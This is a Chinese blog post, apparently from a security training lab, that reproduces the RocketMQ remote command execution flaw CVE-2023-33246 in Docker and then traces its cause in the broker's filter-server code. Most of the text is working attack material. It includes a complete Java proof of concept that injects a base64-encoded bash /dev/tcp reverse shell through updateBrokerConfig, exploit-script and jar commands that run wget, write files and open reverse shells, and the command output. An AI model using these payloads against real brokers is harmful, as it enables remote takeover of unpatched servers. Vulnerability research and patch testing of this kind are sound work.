# CVE-2023-33246 命令执行复现分析 - 合天网安实验室 - 博客园

> 原文：[`www.cnblogs.com/hetianlab/p/17491323.html`](https://www.cnblogs.com/hetianlab/p/17491323.html)

RocketMQ 是一款低延迟、高并发、高可用、高可靠的分布式消息中间件。既可为分布式应用系统提供异步解耦和削峰填谷的能力，同时也具备互联网应用所需的海量消息堆积、高吞吐、可靠重试等特性。

#### 影响版本

<=`RocketMQ 5.1.0`

<=`RocketMQ 4.9.5`

#### 环境搭建

```
docker pull apache/rocketmq:4.9.4
```

![image-20230605153453593](img/c4e2619e5eef53d475a6c685f48eb710.png)

```
root@ubuntu:/home/ubuntu/Desktop# docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.4 sh mqnamesrv      //起 nameserver
```

创建 broker.conf，并且修改配置文件内容

![image-20230615155042723](img/df770833d26cb063a2a70ff0dcaa8b5b.png)

```
root@ubuntu:/home/ubuntu/Desktop# docker run -d --name rmqbroker --link rmqnamesrv:namesrv -e "NAMESRV_ADDR=namesrv:9876" -p 10909:10909 -p 10911:10911 -p 10912:10912 apache/rocketmq:4.9.4 sh mqbroker -c /home/rocketmq/rocketmq-4.9.4/conf/broker.conf    //起 Broker
```

![image-20230608173548843](img/39be8f516daff258223f3ec6ee58cf5a.png)

```
docker ps
```

![image-20230608173815060](img/d79e91a1d4da15abd240e7fab94fb9a1.png)

> [`127.0.0.1:10912/`](http://127.0.0.1:10912/)

![image-20230608173919660](img/84a781bdaadeb96468b617b8a3394e38.png)

```
python3 check.py --ip 10.10.14.72 --port 9876
```

![image-20230612101500792](img/ccdf76321d699ff5d7961b887d56311a.png)

```
python3 CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py 10.10.14.72 10911 wget  10.10.14.162:8666/1.txt
```

![image-20230612125101859](img/43a3c473538fa3f4437ea9430b056b0f.png)

使用 vulhub 直接搭建可能效果好一点儿，否则，不知道为什么在漏洞利用执行上面命令的时候无回显，可能 exp 的问题

【----帮助网安学习，以下所有学习资料免费领！加 vx：yj009991，备注 “博客园” 获取！】

　① 网安学习成长路径思维导图
　② 60+网安经典常用工具包
　③ 100+SRC 漏洞分析报告
　④ 150+网安攻防实战技术电子书
　⑤ 最权威 CISSP 认证考试指南+题库
　⑥ 超 1800 页 CTF 实战技巧手册
　⑦ 最新网安大厂面试题合集（含答案）
　⑧ APP 客户端安全检测指南（安卓+IOS）

```
cd vulhub/rocketmq/CVE-2023-33246
docker-compose up -d
```

POC 如下

```
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;
​
import java.util.Base64;
import java.util.Properties;
​
public class poc {
    private static String getCmd(String ip, String port) {
        String cmd = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
        String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());
        return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";
    }
​
    public static void main(String[] args) throws Exception {
        String targetHost = "目的 IP";
        String targetPort = "10911";

        String shellHost = "VPSIP";
        String shellPort = "Listen-port";

        String targetAddr = String.format("%s:%s",targetHost,targetPort);
        Properties props = new Properties();
        props.setProperty("rocketmqHome", getCmd(shellHost,shellPort));
        props.setProperty("filterServerNums", "1");
        // 创建 DefaultMQAdminExt 对象并启动
        DefaultMQAdminExt admin = new DefaultMQAdminExt();
​
//        admin.setNamesrvAddr("0.0.0.0:12345");
        admin.start();
        // 更新配置⽂件
        admin.updateBrokerConfig(targetAddr, props);
        Properties brokerConfig = admin.getBrokerConfig(targetAddr);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));
        // 关闭 DefaultMQAdminExt 对象
        admin.shutdown();
    }
}
```

使用 IDEA 创建 maven 项目，创建 xml 文件下载依赖,下载地址

> [`mvnrepository.com/artifact/org.apache.rocketmq/rocketmq-tools/4.9.4`](https://mvnrepository.com/artifact/org.apache.rocketmq/rocketmq-tools/4.9.4)

![image-20230615100244421](img/2593ebd23bd60b2e79a772a75722325b.png)

```
<!-- https://mvnrepository.com/artifact/org.apache.rocketmq/rocketmq-tools -->
<dependency>
    <groupId>org.apache.rocketmq</groupId>
    <artifactId>rocketmq-tools</artifactId>
    <version>4.9.4</version>
</dependency>
```

![image-20230615103757592](img/a0baf48ea7c0a17b2ba45bd423d6aa2d.png)

修改 POC

```
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;
​
import java.util.Base64;
import java.util.Properties;
​
public class poc {
    private static String getCmd(String ip, String port) {
        String cmd = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
        String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());
        return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";
    }
​
    public static void main(String[] args) throws Exception {
        String targetHost = "10.10.14.72";
        String targetPort = "10911";

        String shellHost = "10.10.14.72";
        String shellPort = "65532";

        String targetAddr = String.format("%s:%s",targetHost,targetPort);
        Properties props = new Properties();
        props.setProperty("rocketmqHome", getCmd(shellHost,shellPort));
        props.setProperty("filterServerNums", "1");
        // 创建 DefaultMQAdminExt 对象并启动
        DefaultMQAdminExt admin = new DefaultMQAdminExt();
​
//        admin.setNamesrvAddr("0.0.0.0:12345");
        admin.start();
        // 更新配置⽂件
        admin.updateBrokerConfig(targetAddr, props);
        Properties brokerConfig = admin.getBrokerConfig(targetAddr);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));
        // 关闭 DefaultMQAdminExt 对象
        admin.shutdown();
    }
}
```

反弹结果

![image-20230615115733747](img/0ad25e5e6f024f6d91e335ea2a891ba5.png)

```
git clone https://github.com/SuperZero/CVE-2023-33246.git
java -jar CVE-2023-33246.jar -ip "127.0.0.1:10911" -cmd "222 >/root/2.txt"
```

![image-20230615153715566](img/6a611c03c4e5f0e2bd1f8a8fd4544679.png)

进入容器，查看根部录下文件是已写入

![image-20230615153833934](img/72e1fd96aff73a10998914a4d84f00a0.png)

```
java -jar CVE-2023-33246.jar -ip "127.0.0.1:10911" -cmd "bash -i >& /dev/tcp/10.10.14.72/65532 0>&1"
```

反弹 shell

![image-20230615162234961](img/3686329cf45f6b849f5468104e4ddffb.png)

#### 漏洞分析

启动 broker 路由如下：

```
main:50, BrokerStartup (org.apache.rocketmq.broker)
start:55, BrokerStartup (org.apache.rocketmq.broker) 
start:1570, BrokerController (org.apache.rocketmq.broker) 
startBasicService:1527, BrokerController (org.apache.rocketmq.broker) 
start:57, FilterServerManager (org.apache.rocketmq.broker.filtersrv)
```

当在函数`org.apache.rocketmq.broker.filtersrv.FilterServerManager`61 行

![image-20230616102658128](img/97d3e0b3dc2e4e8a3add413c73f0f583.png)

调用下面的`createFilterServer`方法，71 行中看到从配置文件中获取参数。72 行调用方法`buildStartCommand`

![image-20230616105316243](img/8a03bc85d25fee1613bd9ea9284b2b9f.png)

该方法中取到变量`NamesrvAddr`和 `RocketmqHome`,获取之后进行拼接 cmd，在 72 行拿到拼接后的`cmd`

![image-20230616105415604](img/6d72d4129aa3fcc55e4391789929d645.png)

进入 for 循环后在`org.apache.rocketmq.broker.filtersrv.FilterServerUtil`中给的`callshell`方法去执行命令

![image-20230616105538500](img/1dee6a96f983c0a06e32604eaa8de828.png)

该中间件本来就是每 30 秒执行一次，漏洞产生的就是修改了配置文件，变量被赋值为了恶意命令，导致了命令执行。

![image-20230616105824880](img/6a136fae2944ac9d89d21daa977e1dff.png)

**更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**